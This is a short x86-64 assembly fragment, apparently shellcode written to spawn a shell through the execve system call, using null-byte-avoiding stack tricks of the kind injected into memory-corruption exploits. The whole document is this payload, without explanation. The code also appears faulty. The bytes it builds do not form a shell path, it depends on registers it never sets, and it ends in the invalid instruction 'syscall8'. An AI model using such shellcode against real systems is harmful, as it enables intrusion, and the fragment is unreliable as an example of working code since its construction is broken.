    
_start:
    xor eax, eax
    mov al,0x68
    mov ah,0x68

    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1
    shl eax,1

    mov al,0x2f
    mov ah,0x6e
    
    push rax


    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall8
